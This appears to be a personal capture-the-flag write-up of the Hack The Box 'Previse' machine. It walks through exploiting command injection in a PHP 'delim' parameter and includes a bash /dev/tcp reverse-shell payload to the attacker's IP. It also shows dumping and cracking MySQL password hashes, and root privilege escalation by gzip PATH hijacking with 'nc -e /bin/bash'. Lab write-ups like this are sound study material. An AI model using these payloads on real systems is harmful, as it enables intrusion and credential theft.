@@ -1,0 +1,232 @@
+Using burpsuite we can view this info:
+	
+	MySQL server is present 
+	
+GET /status.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://10.10.11.104
+DNT: 1
+Connection: close
+Referer: http://10.10.11.104/
+Cookie: PHPSESSID=admin
+Upgrade-Insecure-Requests: 1
+
+
+
+files?
+GET /files.php HTTP/1.1
+
+
+SO i was able to create an account!
+
+POST /accounts.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Origin: http://10.10.11.104
+DNT: 1
+Connection: close
+Referer: http://10.10.11.104/
+Cookie: PHPSESSID=admin
+Upgrade-Insecure-Requests: 1
+
+username=s4msepi00l&password=s4msepi00l&confirm=s4msepi00l
+
+Well this way is much easier and less troublesome, it looks like sometimes using burp it's not the best.
+	curl -s -X POST "http://10.10.11.104/accounts.php" -d "username=elBicho4423&password=s4msepi00l&confirm=s4msepi00l" --cookie "Cookie: PHPSESSID=admin"
+
+And let's download that zip we found on files.php just in case, there we'll find the source code of all the pages
+Looking a little closer to a php file named "logs.php" source code, we can spot the vulnerability right away.
+	
+	Line 19  -> $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
+				it's executing a command on the box! (using the exec function)
+
+So here i was stuck a little, beacose i can upload files but couldn't get the server to execute them. What's next then?
+I decided to take on the page containing the source code vuln we saw above. Intercept the POST request using BurpSuite and add a ";$(wget http://<ip>/test)"
+
+POST /logs.php HTTP/1.1
+
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Origin: http://10.10.11.104
+DNT: 1
+Connection: close
+Referer: http://10.10.11.104/file_logs.php
+Cookie: PHPSESSID=ui2gbd20f56udgsgqc6mmirlq3
+Upgrade-Insecure-Requests: 1
+
+delim=tab;$(wget+http%3a//10.10.14.121/test)
+
+
+The response worked as expected!.
+
+❯ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.104 - - [07/Jan/2022 17:12:36] code 404, message File not found
+10.10.11.104 - - [07/Jan/2022 17:12:36] "GET /test HTTP/1.1" 404 -
+
+Therefore we can manage to get a reverse shell on the box. This is often called "intrusion vector". Keep it simple, just re-use the famouse bash script
+	
+	BurpSuite -> delim=comma;$(bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.121/9999+0>%261')      //replace the "&" with it's ASCII value "%26")
+
+Set up a listener
+	Attack Box -> nc -lnvp 9999
+
+And we recive a shell as www-data user
+	❯ nc -lnvp 9999
+	listening on [any] 9999 ...
+	connect to [10.10.14.121] from (UNKNOWN) [10.10.11.104] 52000
+	bash: cannot set terminal process group (1484): Inappropriate ioctl for device
+	bash: no job control in this shell
+	www-data@previse:/var/www/html$ whoami
+	www-data
+
+Firstly we need to set up an interactive shell using the following commands:
+	
+	-> www-data@previse:/var/www/html$ script /dev/null -c bash
+	script /dev/null -c bash
+	Script started, file is /dev/null
+	-> www-data@previse:/var/www/html$ ^Z    (hit CTRL+Z here)
+	zsh: suspended  nc -lnvp 9999
+	-> ❯ stty raw -echo; fg
+	[1]  + continued  nc -lnvp 9999
+                               reset
+	reset: unknown terminal type unknown
+	Terminal type? xterm
+	-> www-data@previse:/var/www/html$ export TERM=xterm
+	-> www-data@previse:/var/www/html$ export SHELL=bash      (SHELL env variable now it's a bash shell)
+	-> www-data@previse:/var/www/html$ stty rows 51 cols 165      (rows and cols values can vary given the size of your screen)
+
+We now have a shell, better an interactive shell so we can ^C or ^L to clear the screen. But playtime it's over, let's get into the privesc portion.
+Secondly we need to become m4lwhere usser
+	
+	www-data@previse:/var/www/html$ cat /etc/passwd | grep bash
+	root:x:0:0:root:/root:/bin/bash
+	m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
+
+How come? well remember the MySQL server was up and running and we have creds!
+
+	-> www-data@previse:/var/www/html$ cat config.php          
+	<?php
+	function connectDB(){
+	    $host = 'localhost';
+	    $user = 'root';
+	    $passwd = 'mySQL_p@ssw0rd!:)';
+	    $db = 'previse';
+	    $mycon = new mysqli($host, $user, $passwd, $db);
+	    return $mycon;
+	}
+	?>
+	
+Let's take a look at mysql server 
+
+	-> www-data@previse:/var/www/html$ mysql -u root -D previse -p
+	Enter password: mySQL_p@ssw0rd!:)
+
+	mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| previse            |
+| sys                |
++--------------------+
+
+	mysql> show tables;
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+
+	mysql> SELECT * FROM accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | 999shit  | $1$🧂llol$wHmAAli49roEAhDJmONpb0 | 2022-01-07 13:49:19 |
+|  3 | admin123 | $1$🧂llol$G3KunFyMrVvsqYP1JpRi70 | 2022-01-07 13:55:28 |
+|  4 | webbey   | $1$🧂llol$rCfLNVEV/lMn6ru.fXs/a1 | 2022-01-07 14:02:21 |
+|  5 | username | $1$🧂llol$.4brdywZXNdthoEnmT1v8/ | 2022-01-07 16:45:10 |
+|  6 | adminUno | $1$🧂llol$SgVC5OVLqbP6XvAFzVN1N. | 2022-01-07 17:04:08 |
+|  7 | hacker7  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2022-01-07 17:32:24 |
++----+----------+------------------------------------+---------------------+
+
+
+Crack the m4lwhere hashed password with john
+	
+	-> echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hash
+	-> sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+After a while we crack the password, we get:
+		ilovecody112235!
+
+Pretty straight forward now, we ssh into m4lwhere and start our way to root privesc!
+
+	-> ssh m4lwhere@10.10.11.104
+	(paste the password)
+	-> m4lwhere@previse:~$ ls
+	user.txt
+	-> m4lwhere@previse:~$ cat user.txt
+	(flag)
+	
+And now? we can sudo -l to see what can we do.
+
+	-> m4lwhere@previse:~$ sudo -l 
+	[sudo] password for m4lwhere: 
+	User m4lwhere may run the following commands on previse:
+	(root) /opt/scripts/access_backup.sh
+	-> m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+		#!/bin/bash
+
+	gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+	gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+
+This is indicating us that it's using gzip to zip the access.log into /var/backups/... the issue here is that it's not using the full path of gzip
+and this is worring beacose we can laverage this to perform a path hijacking!
+
+	The plan here is the following:
+		1) go to /tmp/ folder
+		2) make a file named gzip
+		3) inside the file we say we want a bash through a netcat connection to our machine 
+			-> nc -e /bin/bash <ip> <port>
+		4) we chmod +x the file we've just created
+		5) IMPORTANT! we now export this path (remember we are at m4lwhere@previse:/tmp$) 
+			-> export PATH=$(pwd):$PATH
+		6) now we run the .sh script as sudo, ofc paste the password for m4lwhere acc, and don't forget to set up the nc listener in your box.
+		7) success!
+
+	❯ nc -lnvp 6666
+	
+	listening on [any] 6666 ...
+	connect to [10.10.14.121] from (UNKNOWN) [10.10.11.104] 50886
+	vmware-root_834-2722239005
+	
+	script /dev/null -c bash
+	Script started, file is /dev/null
+	
+	root@previse:/tmp# cat /root/root.txt
+	(flag!)
+
+Conclusion and personal words for the future me:
+	Take brakes, you may be hard stuck at some point of the challenge or box, go take a nap or go for a walk, but stay away from the computer if you're suck.
+I really liked this machine, this is the first machine i root without looking at any writeup. Even though it took some time to complete not only beacose i'm a noob
+it is also an "easy" box, i have to say i'm making small but steady progress and i'm enjoying the ride!
